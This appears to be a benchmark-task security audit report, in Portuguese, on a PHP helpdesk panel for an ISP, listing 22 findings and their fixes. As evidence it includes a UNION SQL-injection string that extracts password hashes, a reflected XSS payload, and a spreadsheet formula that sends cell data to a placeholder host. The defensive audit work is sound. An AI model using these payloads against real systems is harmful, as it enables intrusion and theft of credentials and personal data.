# RELATORIO — LEB-100-A (Painel de Chamados, NetX ISP)

| | |
| --- | --- |
| Instância | LEB-100-A (nível 100, versão 1.1) · LEB spec 1.1.0 · tarefa 1.0.0 |
| Matriz (SHA-256) | `68088abdb7bc54fa949be972b5cf1f89c2c1c3c9f95b6e472385a6fa084c8625` |
| Entregue | `code/` alterado no lugar · este relatório · `achados.json` (mesmos achados, mesmos ids) |

## 1. Resumo

O sistema funciona para o caminho feliz, mas **não aplica a regra de visibilidade do manifesto** e tem uma **injeção de SQL** acessível a qualquer cliente logado. Em conjunto, um cliente consegue ler os chamados de todos os outros por três caminhos (detalhe, listagem, CSV) e, via SQL injection, extrair a tabela de usuários com hashes MD5 sem sal — o que leva à tomada de contas de técnicos. Há ainda XSS refletido, fixação de sessão, senha de produção e chave de API no código, uma divisão por zero que derruba a página principal quando nenhum chamado foi respondido, e um N+1 que faz a listagem e o export custarem 1 + N consultas.

Foram **22 achados**: 1 crítico, 6 altos, 8 médios, 7 baixos. **19 corrigidos** no código (`corrigido: true`); **3 não** (F13, F15, F22): F13 (força bruta no login) e F22 (paginação) ficaram só reportados, e F15 (causa-raiz arquitetural) foi **mitigado, não eliminado**, porque o manifesto congela as assinaturas.

Alterei 4 de 5 arquivos de `code/` (`lib.php`, `index.php`, `config.php`, `schema.sql`), sem renomear/mover nada e sem dependência nova. Contrato preservado e **verificado por execução**, não só por leitura: assinaturas idênticas por reflexão, saída das funções públicas idêntica byte a byte (incluindo tipos), CSV de técnico idêntico, HTML da listagem com a mesma estrutura. As únicas diferenças de saída são as correções de segurança.

### Antes de subir (checklist de deploy — há itens que NÃO são código)

1. **Definir `DB_PASS` (e `SMTP_API_KEY`) no ambiente do PHP antes de publicar** (php-fpm: `env[DB_PASS]=…` no pool, pois `clear_env=yes` é o padrão; Apache: `SetEnv`; systemd: `Environment=`). Sem isso o painel responde 500, de propósito (F5).
2. **Rotacionar a senha do banco e a chave SMTP.** Estão em texto claro no código (e, portanto, no histórico do repositório e em backups); removê-las do arquivo não as invalida.
3. **Fazer backup de `usuarios`** e rodar `ALTER TABLE usuarios MODIFY senha VARCHAR(255) NOT NULL;`. Sem o ALTER nada quebra (o login segue com MD5), mas as senhas não migram. O usuário do aplicativo precisa de `UPDATE` em `usuarios`; sem ele o hash não é regravado e o motivo vai para o log.
4. **Rollback:** depois que usuários logarem com o código novo, as senhas deles estarão em bcrypt e o código antigo (que compara MD5) não os autentica. Para voltar atrás, restaure o backup de `usuarios` ou redefina as senhas.
5. **Conferir se alguma rotina lê `EXPORT_DIR/chamados.csv`** (o manifesto não declara isso, mas é um acoplamento possível da rotina noturna). O export agora não grava arquivo (F8); uma rotina assim deve capturar a saída de `exportarCsv()`.
6. Recomendado no php.ini de produção: `display_errors=0`, `session.cookie_secure=1`.

## 2. Achados (na ordem em que eu priorizaria a correção)

Linhas citadas = **numeração original** dos arquivos recebidos (é a que consta em `achados.json`). Confiança = probabilidade (0–100) de o problema ser real.

### F1 — SQL injection na busca por título (LIKE concatenado)

- **Onde:** `code/lib.php:80-85` (concatenação na linha 82); origem do dado em `code/index.php:72`.
- **Categoria / severidade / confiança:** segurança · **crítica** · **99**
- **Mecanismo:** index.php:72 repassa $_GET['busca'] sem tratamento a listarChamados(), que em lib.php:82 monta "WHERE titulo LIKE '%" . $busca . "%'" por concatenação e executa com $db->query() (linha 85). Uma aspa simples fecha o literal e o resto vira SQL: busca=zzz' UNION SELECT id,id,id,senha,login,id,id,id,NOW() FROM usuarios -- (9 colunas, as mesmas do SELECT *) faz a grade de chamados exibir login e hash de senha de todos os usuários.
- **Impacto:** Qualquer cliente autenticado lê qualquer tabela do banco: dados de todos os clientes e os hashes MD5 de todos os usuários (sem sal, quebram em segundos — F6), o que leva à tomada de contas de técnicos. mysqli::query não aceita múltiplos comandos, então o dano direto é de leitura (inclusive cega, por tempo).
- **O que fiz:** listarChamadosVisiveis() usa prepared statement (LIKE ? com '%'.$busca.'%' vinculado); listarChamados() delega a ela. O mesmo payload no código novo devolve 0 linhas. Os curingas % e _ digitados continuam valendo como no legado (ver Decisões).  _(corrigido: sim)_
- **Evidência:** Reproduzido no código original logado como `ana` (cliente): a grade listou os 4 logins e, com `senha` na coluna do título, os hashes `e7d80ffe…` e `2b21aaa0…`. No código novo, mesmo payload: 0 linhas.

### F2 — Detalhe do chamado (?ver=) sem verificação de dono (IDOR)

- **Onde:** `code/index.php:52-66`; consulta sem filtro em `code/lib.php:98-102`.
- **Categoria / severidade / confiança:** segurança · **alta** · **99**
- **Mecanismo:** index.php:53 chama verChamado($db, (int) $_GET['ver']), que em lib.php:100 faz SELECT * FROM chamados WHERE id = <id> sem saber quem está logado; $uid e $papel são lidos nas linhas 38-39 mas nunca entram na decisão. Qualquer id existente é exibido (título, status, prioridade, descrição).
- **Impacto:** Um cliente enumera ids sequenciais (101, 102, …) e lê os chamados de todos os outros clientes, que trazem dados pessoais e financeiros (ex.: 'Cobranca repetida no cartao'). Viola a regra de visibilidade do manifesto.
- **O que fiz:** index.php calcula $donoId = escopoVisibilidade($papel, $uid) (null para 'tecnico'; o próprio id para qualquer outro papel — falha fechada) e chama verChamadoVisivel(), que acrescenta AND usuario_id = ? na própria SQL. Chamado alheio e chamado inexistente produzem a mesma resposta ('Chamado nao encontrado.'), então não dá para sondar quais ids existem.  _(corrigido: sim)_
- **Evidência:** Original: `ana` abriu `?ver=103` (de `bruno`). Novo: `ana` → 'nao encontrado'; `ana` → 101 continua abrindo; `carla` (técnica) abre 103 e 201.

### F3 — Listagem e busca mostram os chamados de todos os clientes

- **Onde:** `code/index.php:72-74`; consulta sem filtro em `code/lib.php:78-93`.
- **Categoria / severidade / confiança:** segurança · **alta** · **98**
- **Mecanismo:** index.php:73 chama listarChamados($db, $busca), que (lib.php:80-84) faz SELECT * FROM chamados sem filtrar por usuario_id. A página inicial de qualquer cliente lista todos os chamados da base, cada um com link ?ver=; e a busca por título varre os chamados alheios.
- **Impacto:** Vazamento horizontal de dados de todos os clientes só por navegar, sem explorar nada; serve de índice para o IDOR (F2). Viola a regra de visibilidade do manifesto.
- **O que fiz:** A listagem passa a usar listarChamadosVisiveis($db, $donoId, $busca), que combina o filtro de dono e a busca na mesma consulta (AND).  _(corrigido: sim)_
- **Evidência:** Original: `ana` via 105/104/103/102/101 e, buscando 'Troca', achou o 103 de `bruno`. Novo: `ana` vê 101/102/105; `bruno` vê 103/104; cliente sem chamados vê tabela vazia; técnica vê os 11 chamados do banco de teste, HTML idêntico ao original.

### F4 — Exportação CSV entrega todos os chamados a qualquer usuário logado

- **Onde:** `code/index.php:44-47`; consulta sem filtro em `code/lib.php:132`.
- **Categoria / severidade / confiança:** segurança · **alta** · **98**
- **Mecanismo:** index.php:44-47 chama exportarCsv($db) para qualquer sessão válida; lib.php:132 faz SELECT * FROM chamados ORDER BY id sem filtro. Um único GET ?export=csv devolve todos os chamados de todos os clientes (título, status, técnico, data) a um cliente.
- **Impacto:** Exfiltração em massa com um clique (ou um curl), já em formato de planilha — pior que F3, pois dispensa paginar a interface. Viola a regra de visibilidade do manifesto.
- **O que fiz:** Nova exportarCsvVisivel($db, $donoId), usada pela web. exportarCsv($db) mantém assinatura e comportamento (todos os chamados) para a rotina noturna, que não tem usuário logado. O CSV de cliente só traz os chamados dele; o de técnico é byte a byte igual ao original.  _(corrigido: sim)_
- **Evidência:** Original: CSV de `ana` com as 5 linhas (incluindo 103 e 104). Novo: `ana` → 101,102,105; `bruno` → 103,104; técnica → idêntico ao original.

### F5 — Credenciais embutidas no código (senha do banco de produção e chave da API de e-mail)

- **Onde:** `code/config.php:11-15` (DB_PASS na linha 12, SMTP_API_KEY na linha 15).
- **Categoria / severidade / confiança:** segurança · **alta** · **99**
- **Mecanismo:** config.php:12 usa a senha de produção do banco como fallback literal de getenv('DB_PASS'): se a variável não existe, o sistema sobe 'sozinho' com a senha que está no repositório. config.php:15 define SMTP_API_KEY com valor literal. Os segredos viajam em todo clone, backup e histórico do repositório (sistema em produção desde 2013). SMTP_API_KEY não é referenciada em nenhum outro arquivo de code/.
- **Impacto:** Quem tiver acesso ao código (dev ou ex-dev, backup, repositório vazado) obtém a credencial do banco de produção e a chave do serviço de e-mail transacional, podendo ler/alterar dados ou enviar e-mail em nome da NetX.
- **O que fiz:** Segredos removidos do código: DB_PASS vem só de getenv() (se faltar, registra no log e a conexão falha → 500, em vez de usar a senha embutida); SMTP_API_KEY vem de getenv(), com a constante mantida definida (vazia) para não quebrar scripts que a referenciem. Tirar do arquivo NÃO des-vaza: as duas credenciais precisam ser ROTACIONADAS e o ambiente (php-fpm env[], SetEnv, systemd) configurado antes do deploy — ver checklist.  _(corrigido: sim)_
- **Evidência:** Sem DB_PASS no ambiente, o código novo responde 500 'Falha ao conectar ao banco.' e registra 'config.php: variavel de ambiente DB_PASS nao definida'.

### F6 — Senhas armazenadas e comparadas com MD5 sem sal

- **Onde:** `code/lib.php:15-20`; coluna em `code/schema.sql:7` (`senha CHAR(32)`).
- **Categoria / severidade / confiança:** segurança · **alta** · **97**
- **Mecanismo:** autenticar() calcula md5($senha) (lib.php:15) e compara com usuarios.senha direto no SQL (linha 16). MD5 é rápido e sem sal: o mesmo texto gera o mesmo hash — no seed, ana e bruno têm hash idêntico, e carla e diego também, o que já revela senhas repetidas — e é invertível por tabela/GPU em segundos. Com a SQLi de F1 o hash sai do banco (extraído nos testes: e7d80ffe… = md5('senha123')).
- **Impacto:** Qualquer vazamento da tabela (F1, backup, dump) equivale ao vazamento das senhas em claro, com risco de reuso em outros serviços. A comparação direta no SQL também não é de tempo constante.
- **O que fiz:** autenticar() (assinatura e retorno iguais) busca a linha por login e confere em PHP: hash legado de 32 hex → hash_equals(md5); senão → password_verify. No primeiro login legado bem-sucedido o hash é regravado com password_hash() (atualizarHashSenha), com compare-and-swap (AND senha = ?) e SOMENTE se a coluna comportar o hash. schema.sql passou a VARCHAR(255). Para a migração valer em produção é preciso rodar o ALTER TABLE (checklist); sem ele, o login segue funcionando com MD5, sem truncar nada. seed.sql foi mantido com MD5 (migra no 1º login).  _(corrigido: sim)_
- **Evidência:** Testado nos dois schemas. VARCHAR(255): ana/carla autenticam, o hash vira bcrypt de 60 chars, 2º login ok, senha errada não autentica nem altera o hash. CHAR(32) com sql_mode vazio: um UPDATE ingênuo gravou `$2y$12$abcdefghijklmnopqrstuvABC` (60→32 chars, truncado em silêncio) — com a guarda, o MD5 permaneceu e o login continuou funcionando.

### F7 — XSS refletido no parâmetro busca (atributo value e texto 'Resultados para')

- **Onde:** `code/index.php:79` e `:82`.
- **Categoria / severidade / confiança:** segurança · **alta** · **99**
- **Mecanismo:** index.php:79 imprime $busca dentro de value="..." e :82 imprime em <p>, sem htmlspecialchars (que o resto do arquivo aplica a título e descrição). busca="><script>alert(1)</script> fecha o atributo e injeta script. É GET: basta o alvo abrir um link.
- **Impacto:** Script roda na origem do painel com a sessão do alvo: lê/exporta todos os chamados (técnicos veem todos) e age em nome do usuário. Como o cookie de sessão não era HttpOnly (F9), também pode ser roubado.
- **O que fiz:** Helper h() = htmlspecialchars(ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') aplicado a $busca nos dois pontos e a todo texto vindo do banco; ids numéricos impressos com (int).  _(corrigido: sim)_
- **Evidência:** Original devolveu `value=""><script>alert(1)</script>"`. Novo: `value="&quot;&gt;&lt;script&gt;…"` (inerte), nos dois pontos.

### F8 — Exportação grava num arquivo fixo e compartilhado (EXPORT_DIR/chamados.csv) e o deixa em disco

- **Onde:** `code/lib.php:125-150`; caminho em `code/config.php:18`.
- **Categoria / severidade / confiança:** segurança · **média** · **80**
- **Mecanismo:** exportarCsv() abre sempre o mesmo caminho, EXPORT_DIR/chamados.csv, em modo 'w' (trunca), escreve, fecha e só então faz readfile() (lib.php:125-150). Requisições simultâneas compartilham e truncam o mesmo arquivo. Hoje todos recebem o mesmo conteúdo, então o efeito seria só truncamento; mas, com a visibilidade por usuário (F3/F4), um arquivo compartilhado passaria a vazar o export de um usuário para outro. Além disso o arquivo permanece em disco com TODOS os chamados, em /var/www/painel/tmp — possivelmente dentro do document root. Se fopen falha a função retorna sem cabeçalho nem corpo (linha 128) e, se a consulta falha, sem fechar $fp (linhas 133-135).
- **Impacto:** Dados pessoais de todos os clientes ficam persistidos sem controle de acesso por tempo indeterminado; se o diretório for servido pelo web server, ficam baixáveis sem login. Em concorrência, respostas truncadas/misturadas.
- **O que fiz:** exportarCsvVisivel() escreve direto em php://output: nenhum arquivo, nenhum estado compartilhado; consulta antes de enviar cabeçalhos (se falhar, não sai CSV 200 pela metade). EXPORT_DIR continua definida, sem uso. Risco de compatibilidade fora do manifesto: se alguma rotina lê EXPORT_DIR/chamados.csv depois de exportar, deixa de encontrá-lo (ver Decisões).  _(corrigido: sim)_
- **Evidência:** Arquivo residual observado: 414 KB com os 5.000 chamados em EXPORT_DIR após as exportações. A corrupção por concorrência NÃO foi reproduzida (12 requisições simultâneas e 14 escalonadas, 8 workers: 0 respostas diferentes) — o readfile após o fclose dura microssegundos e o conteúdo é idêntico entre requisições. Por isso a confiança é 80, não 95; a severidade depende de o diretório ser servido, o que não consigo saber a partir do código.

### F9 — Fixação de sessão e cookie de sessão sem HttpOnly/SameSite

- **Onde:** `code/index.php:15` (session_start) e `:24-26` (login).
- **Categoria / severidade / confiança:** segurança · **média** · **95**
- **Mecanismo:** Após autenticar, index.php:24-25 grava uid/papel na MESMA sessão aberta na linha 15, sem session_regenerate_id(). Com session.use_strict_mode desligado (padrão), o PHP aceita um id escolhido pelo cliente. O Set-Cookie saía sem HttpOnly nem SameSite.
- **Impacto:** Se o atacante consegue plantar o cookie (XSS de F7, subdomínio vizinho, rede), assume a sessão da vítima após o login — para um técnico, acesso a todos os chamados. A ausência de HttpOnly amplifica F7.
- **O que fiz:** session_regenerate_id(true) ao autenticar; session_start() com use_strict_mode, cookie_httponly, cookie_samesite=Lax e cookie_secure quando a requisição é HTTPS. Atrás de proxy TLS que não repassa o HTTPS ao PHP o Secure não liga sozinho: recomenda-se session.cookie_secure=1 no php.ini.  _(corrigido: sim)_
- **Evidência:** Ataque executado: atacante fixa PHPSESSID, a vítima (`ana`) loga com ele. Original: o atacante passa a ver 'Chamados'. Novo: continua vendo 'Entrar'. Set-Cookie novo: `HttpOnly; SameSite=Lax`, e o id muda após o login.

### F10 — mediaResposta() divide por zero quando nenhum chamado tem resposta registrada

- **Onde:** `code/lib.php:109-116` (divisão na linha 116); chamada em `code/index.php:74`.
- **Categoria / severidade / confiança:** bug · **média** · **99**
- **Mecanismo:** A função soma os minutos_resposta não nulos e retorna $soma / $qtd (lib.php:116) sem testar $qtd === 0. No PHP 8 isso lança DivisionByZeroError (no PHP 7 era só um warning, com resultado NAN). Acontece com tabela vazia ou quando todos os chamados ainda estão sem 1ª resposta. index.php:74 chama a função em TODA renderização da listagem, então a exceção derruba a página inicial.
- **Impacto:** Indisponibilidade da tela principal para todos os usuários enquanto não houver ao menos um chamado respondido — instalação nova, base expurgada, ou um período sem respostas. Nada no schema impede esse estado.
- **O que fiz:** mediaResposta() usa SUM/COUNT no banco e devolve 0.0 quando COUNT = 0 (a tela mostra '0 min'). Havendo dados, o resultado é idêntico ao original (25.666666666666668 no seed; 44.8 nos 5.000 chamados).  _(corrigido: sim)_
- **Evidência:** Original (PHP 8.4): `DivisionByZeroError` nos bancos vazio e só-NULL; na listagem HTTP, status 500 para um cliente logado. Novo: `float(0)`, HTTP 200.

### F11 — N+1 na listagem: uma consulta por chamado para buscar o nome do técnico

- **Onde:** `code/lib.php:88-91` (chamada) e `:64-72` (tecnicoNome).
- **Categoria / severidade / confiança:** performance · **média** · **99**
- **Mecanismo:** Dentro do while de listarChamados (lib.php:88-91), cada linha chama tecnicoNome() (64-72), que dispara SELECT nome FROM usuarios WHERE id = ...: 1 consulta + N. O custo cresce linearmente com o número de chamados, na tela principal.
- **Impacto:** Latência e carga no banco proporcionais ao volume de chamados, em cada abertura do painel.
- **O que fiz:** listarChamadosVisiveis() traz o nome com LEFT JOIN usuarios t ON t.id = c.tecnico_id e COALESCE(t.nome, '-'), preservando a chave tecnico_nome e o '-' para chamado sem técnico. tecnicoNome() foi mantida (compatibilidade), agora parametrizada.  _(corrigido: sim)_
- **Evidência:** 5.000 chamados: 4.287 consultas → 1; 2.075 ms → 85 ms (~24×). Saída da função idêntica à original no banco de caracterização.

### F12 — N+1 na exportação CSV: mesma consulta por linha

- **Onde:** `code/lib.php:136-145` (chamada na linha 137).
- **Categoria / severidade / confiança:** performance · **média** · **99**
- **Mecanismo:** O while de exportarCsv chama tecnicoNome() em cada iteração (lib.php:137): 1 consulta + N, num endpoint que por natureza percorre a tabela inteira.
- **Impacto:** Exportação lenta e pesada para o banco, que cresce com o histórico de chamados — e roda também na rotina noturna.
- **O que fiz:** exportarCsvVisivel() faz um único SELECT com LEFT JOIN no técnico e escreve cada linha direto na saída.  _(corrigido: sim)_
- **Evidência:** 5.000 chamados: 4.287 consultas → 1; 2.425 ms → 47 ms (~51×); CSV de técnico idêntico byte a byte.

### F13 — Login sem nenhuma proteção contra tentativa em massa de senhas

- **Onde:** `code/index.php:21-29`.
- **Categoria / severidade / confiança:** segurança · **média** · **70**
- **Mecanismo:** O bloco de login chama autenticar() a cada POST, sem contador de falhas, atraso, bloqueio ou CAPTCHA, e sem qualquer estado que permita implementá-los (o schema não tem tabela/coluna para isso). Quem conhece um login (ex.: 'carla') pode tentar senhas sem limite.
- **Impacto:** Adivinhação de senhas de técnicos, que têm acesso a todos os chamados. O risco é maior enquanto houver senhas fracas/repetidas (o seed tem hashes idênticos para usuários diferentes). Pode já existir rate limit fora do código (proxy/WAF/fail2ban), que não consigo ver — daí a confiança 70.
- **O que fiz:** NÃO corrigido: exige estado novo (tabela ou cache de tentativas) ou configuração de infraestrutura, o que foge de 'evoluir sem reescrever'. Proposta: rate limit por IP+login no proxy e/ou fail2ban sobre o log, e bloqueio progressivo no aplicativo numa próxima mudança de schema.  _(corrigido: não)_
- **Evidência:** Não testado por execução (é ausência de controle); conferido por leitura do fluxo e do schema.

### F14 — Injeção de fórmula (CSV injection) nas colunas de texto do CSV

- **Onde:** `code/lib.php:138-144`.
- **Categoria / severidade / confiança:** segurança · **média** · **60**
- **Mecanismo:** fputcsv grava $c['titulo'] (campo livre) e o nome do técnico como vieram. Um título começando por =, +, - ou @ — ex.: =HYPERLINK("http://x/?c="&A2;"clique") — é executado como fórmula quando técnico ou gestor abre o CSV no Excel/LibreOffice. Não consigo ver de onde vêm os títulos (nenhum código aqui cria chamados), mas o schema os declara como do cliente que abriu.
- **Impacto:** Exfiltração de células da planilha para um servidor externo ou execução assistida de comandos, a partir do computador de quem abre o export. Confiança 60 porque depende de o cliente poder digitar o título.
- **O que fiz:** csvNeutralizarFormula() prefixa um apóstrofo em título e nome de técnico que começam por = + - @ TAB ou CR; o placeholder '-' de 'sem técnico' é preservado. Custo conhecido: um título legítimo como '+55 11 9…' passa a sair como "'+55 11 9…" (ver Decisões).  _(corrigido: sim)_
- **Evidência:** Testado com títulos =HYPERLINK, +55…, -cmd|…, @SUM: todos neutralizados; linhas 104/201 mantêm '-' como técnico; round-trip com fgetcsv íntegro.

### F15 — Regra de visibilidade inexistente na camada de dados: cada rota precisa lembrar de filtrar

- **Onde:** `code/lib.php:78-102` (listarChamados e verChamado) e `:123-151` (exportarCsv).
- **Categoria / severidade / confiança:** arquitetura · **média** · **85**
- **Mecanismo:** As funções públicas de leitura não recebem o usuário (assinaturas fixadas pelo manifesto) e portanto não têm como aplicar a regra de visibilidade; ela dependia de cada rota em index.php fazê-lo — e as três rotas de leitura (?ver, listagem, ?export) esqueceram (F2, F3, F4). Qualquer rota futura repetirá o erro.
- **Impacto:** Causa-raiz de F2-F4: o desenho convida a vazar dados a cada nova funcionalidade de leitura.
- **O que fiz:** Mitigado, não eliminado: a regra foi centralizada em escopoVisibilidade() e em variantes *Visiveis() que exigem o escopo como parâmetro obrigatório (sem default) e filtram na própria SQL; as funções legadas viraram wrappers que passam null (= tudo), documentadas como 'uso interno'. Elas continuam públicas porque o manifesto as congela — por isso 'corrigido: false'. Solução definitiva: serviço que receba o ator, numa mudança de contrato planejada.  _(corrigido: não)_
- **Evidência:** Assinaturas das 7 funções do manifesto idênticas por reflexão (nome, parâmetros, tipos, defaults, retorno).

### F16 — Parâmetros enviados como array (login[], senha[], busca[]) derrubam a página com erro 500

- **Onde:** `code/index.php:22` (login) e `:72-73` (busca).
- **Categoria / severidade / confiança:** bug · **baixa** · **99**
- **Mecanismo:** $_POST['login'] e $_GET['busca'] são repassados direto a autenticar(string) e listarChamados(string). Com login[]=x ou busca[]=x o valor é array e o PHP lança TypeError (fatal). Em ambiente com display_errors ligado, a mensagem expõe caminhos internos.
- **Impacto:** Qualquer visitante (inclusive sem conta, no caso do login) gera 500 à vontade — ruído em log/monitoramento e, conforme a configuração, vazamento de caminhos.
- **O que fiz:** index.php só chama autenticar() se login e senha forem strings, e trata busca não-string como vazia; ver[] vira id 0 ('não encontrado').  _(corrigido: sim)_
- **Evidência:** Original: HTTP 500 em `login[]=ana` e em `?busca[]=x`. Novo: HTTP 200 (formulário de login / listagem), sem warnings com E_ALL.

### F17 — fputcsv sem parâmetro $escape: depreciado no PHP 8.4 e gera CSV malformado com barra invertida antes de aspas

- **Onde:** `code/lib.php:130` e `:138-144`.
- **Categoria / severidade / confiança:** bug · **baixa** · **90**
- **Mecanismo:** As duas chamadas de fputcsv omitem $escape. No PHP 8.4 isso emite E_DEPRECATED, e com display_errors ligado o aviso vai para a saída antes dos header() (que então falham com 'headers already sent'), corrompendo o download. Além disso o escape padrão (\) faz um título com \" sair como "a\"b", que parsers RFC 4180 leem errado.
- **Impacto:** Download corrompido após upgrade do PHP em ambientes com avisos visíveis; campos com barra invertida + aspas mal interpretados pelos consumidores.
- **O que fiz:** Chamadas com $escape = '' (CSV padrão, aspas dobradas). Para dados sem barra invertida antes de aspas a saída é idêntica à original.  _(corrigido: sim)_
- **Evidência:** Reproduzido no PHP 8.4.26: `Deprecated: fputcsv(): the $escape parameter must be provided…`; `a\"b` saía como `"a\"b"`, e agora como `"a\""b"`.

### F18 — Tratamento de falha de conexão ineficaz: connect_errno nunca é alcançado e a exceção expõe usuário/host

- **Onde:** `code/index.php:9-13`.
- **Categoria / severidade / confiança:** segurança · **baixa** · **60**
- **Mecanismo:** Desde o PHP 8.1 new mysqli() lança mysqli_sql_exception em falha de conexão, então o if ($db->connect_errno) (linha 10) é código morto e a mensagem genérica de linha 11 nunca é mostrada. A exceção não capturada imprime 'Access denied for user ...@...' e o caminho do arquivo quando display_errors está ligado (ambientes de homologação/dev costumam ter).
- **Impacto:** Divulgação de usuário do banco e estrutura de diretórios a quem provocar a falha. No PHP 8.4 a senha aparece mascarada no stack trace (SensitiveParameterValue), então não há vazamento da senha nessa versão — por isso a severidade é baixa e a confiança moderada.
- **O que fiz:** Conexão em try/catch (mais o teste de connect_errno, para PHP < 8.1): detalhe só em error_log(), resposta HTTP 500 com a mesma mensagem genérica.  _(corrigido: sim)_
- **Evidência:** Original (display_errors=1): 'Fatal error: Uncaught mysqli_sql_exception: Access denied for user …' com caminhos. Novo: só 'Falha ao conectar ao banco.'.

### F19 — mediaResposta() carrega todas as linhas para o PHP só para calcular uma média

- **Onde:** `code/lib.php:109-115`.
- **Categoria / severidade / confiança:** performance · **baixa** · **85**
- **Mecanismo:** SELECT minutos_resposta FROM chamados WHERE ... traz uma linha por chamado e o loop soma em PHP (linhas 109-115); o banco calcula SUM/COUNT sem transferir nada. Roda em toda abertura da listagem.
- **Impacto:** Custo linear em memória/rede por carregamento de página; pequeno hoje, cresce com o histórico.
- **O que fiz:** Substituído por SELECT SUM(minutos_resposta), COUNT(minutos_resposta) FROM chamados (mesma aritmética, resultado idêntico ao original).  _(corrigido: sim)_
- **Evidência:** 5.000 chamados: 10,7 ms → 4,9 ms, mesmo valor (44.8). Ganho modesto: a severidade é baixa.

### F20 — rotuloPrioridade() com quatro níveis de if aninhados e limite de SLA 'mágico'

- **Onde:** `code/lib.php:40-59`.
- **Categoria / severidade / confiança:** qualidade · **baixa** · **60**
- **Mecanismo:** Seis ramos de retorno distribuídos em quatro níveis de aninhamento (42-58) e o limite de 30 minutos escrito direto na comparação (linha 44). A regra é difícil de ler e de alterar sem erro.
- **Impacto:** Manutenibilidade; não há defeito de comportamento — por isso a confiança de que é 'problema' é moderada (é uma questão de legibilidade).
- **O que fiz:** Reescrita com cláusulas de guarda e o limite nomeado ($limiteSlaMinutos = 30); mesmos retornos para todas as entradas.  _(corrigido: sim)_
- **Evidência:** Comparei antigo × novo numa grade de 63 combinações (prioridade −1…5 × minutos null, −5, 0, 1, 29, 30, 31, 40, 1000): idênticos.

### F21 — Consultas com inteiro concatenado (tecnicoNome, verChamado)

- **Onde:** `code/lib.php:69` e `:100`.
- **Categoria / severidade / confiança:** qualidade · **baixa** · **25**
- **Mecanismo:** As duas funções montam 'WHERE id = ' . $valor. Hoje NÃO é explorável: os parâmetros têm tipo ?int/int e o PHP rejeita (TypeError) ou converte qualquer string, então nenhum texto chega à SQL. É um padrão frágil: se alguém relaxar o tipo ou copiar o padrão para um parâmetro string, vira a F1.
- **Impacto:** Risco latente (defesa em profundidade), sem exploração atual — por isso a confiança de que seja um problema real é baixa (25).
- **O que fiz:** Ambas passaram a usar prepared statement (selecionarPreparado), consistentes com o restante.  _(corrigido: sim)_
- **Evidência:** Sem prova de exploração (não há como); verificado por leitura e pelos tipos declarados.

### F22 — Listagem sem paginação, trazendo todas as colunas (inclusive TEXT) de todos os chamados

- **Onde:** `code/lib.php:78-93`.
- **Categoria / severidade / confiança:** performance · **baixa** · **50**
- **Mecanismo:** SELECT * sem LIMIT carrega toda a tabela, com a coluna descricao (TEXT) que a tela de listagem nem exibe; a busca LIKE '%x%' não usa índice. Tudo é mantido em memória (array de chamados + HTML).
- **Impacto:** Degradação gradual com o crescimento da base; hoje tolerável (5.000 chamados listados em ~85 ms depois do ajuste de F11).
- **O que fiz:** NÃO corrigido: paginar ou reduzir colunas muda o HTML/rotas e o formato de retorno de listarChamados(), que o manifesto congela. Recomendo paginação como evolução de produto.  _(corrigido: não)_
- **Evidência:** Medido no banco de 5.000 chamados: listagem completa em ~85 ms após F11 — por isso severidade baixa.

## 3. Decisões — o que deliberadamente NÃO mudei

- **Assinaturas e retornos das 7 funções públicas do manifesto (e de `tecnicoNome`).** O contrato proíbe. Em vez de acrescentar parâmetros (ainda que opcionais), criei funções novas (`listarChamadosVisiveis`, `verChamadoVisivel`, `exportarCsvVisivel`, `escopoVisibilidade`) e deixei as originais como wrappers. Reflexão confirma assinaturas idênticas. Consequência assumida: as funções legadas continuam devolvendo tudo (F15).
- **Tipos de retorno de listarChamados()/verChamado() (tudo string).** O legado lia com query() (protocolo texto), então todo valor chegava como string. Prepared statements devolveriam int e mudariam o formato (ex.: json_encode do relatório gerencial). Normalizei de volta para string (`linhaComoTexto`); `autenticar` continua devolvendo `id` como int, como antes.
- **formatarStatus(): qualquer status fora de 1 e 2 vira 'Resolvido'.** O manifesto fixa só 1/2/3 e o relatório gerencial casa pelos textos. Mudar o ramo `else` alteraria saída para valores indefinidos. O schema não tem CHECK em status/prioridade; recomendo adicioná-lo em vez de mexer na função.
- **rotuloPrioridade(): chamado crítico sem 1ª resposta fica sempre 'Aguardando 1a resposta'.** Um chamado de prioridade 4 que nunca foi respondido (ex.: o 104, aberto em 04/06) nunca aparece como 'SLA estourado'. Corrigir exigiria o tempo decorrido (criado_em), que a assinatura (prioridade, minutos) não traz. É decisão de produto; deixei como está e registro aqui.
- **Curingas % e _ da busca continuam valendo como curinga.** É o comportamento atual e, depois da parametrização, não tem impacto de segurança (o filtro de dono já limita o que se vê). Escapá-los mudaria resultados de buscas existentes.
- **HTTP 200 para 'chamado nao encontrado' (inclusive quando o chamado é de outro cliente).** Preserva o comportamento atual e, de propósito, não distingue 'inexistente' de 'proibido' (evita enumerar ids). Um 404/403 seria mais correto semanticamente, mas é mudança observável sem pedido do manifesto.
- **mediaResposta() continua global (não por escopo do usuário).** Um cliente vê no topo a média de todos os chamados, não só dos dele. É um agregado, sem dado individual, e a função tem assinatura/semântica fixadas. Levar ao dono do produto se a média deve ser por cliente.
- **Sem paginação, sem limite de colunas (F22) e sem proteção contra força bruta (F13).** Exigem mudança de HTML/rotas/formato de retorno ou estado/infraestrutura novos. Reportados com corrigido=false.
- **seed.sql.** Mantido com MD5: o manifesto declara esses usuários/senhas como dados de teste, e trocar por bcrypt quebraria a carga em qualquer banco que ainda tenha `senha CHAR(32)`. Os hashes migram no 1º login.
- **Constantes EXPORT_DIR e SMTP_API_KEY, e a função tecnicoNome().** Sem uso interno agora, mas outros scripts do ISP podem referenciá-las; remover seria quebra silenciosa. `SMTP_API_KEY` fica definida e vazia (valor vem do ambiente).
- **Estrutura de index.php (rota + login + HTML num arquivo só).** Reorganizar seria reescrever; a restrição 4 manda evoluir. Mexi apenas onde havia defeito.
- **Sessão: papel gravado só no login, sem logout/expiração; login sem token CSRF.** Se o papel de alguém mudar no banco, vale no próximo login; não há logout nem timeout de ociosidade. Não há operação de escrita acessível por GET/POST além do login, então CSRF aqui só afetaria 'login CSRF' (baixo). Fica como recomendação.
- **display_errors e cabeçalhos de segurança (CSP, X-Content-Type-Options).** São configuração do servidor/php.ini, não do código. Recomendo `display_errors=0` e `session.cookie_secure=1` em produção.
- **Sem 'Cache-Control' extra no CSV.** `session_start()` já envia `no-store, no-cache` por padrão; não acrescentei nada.
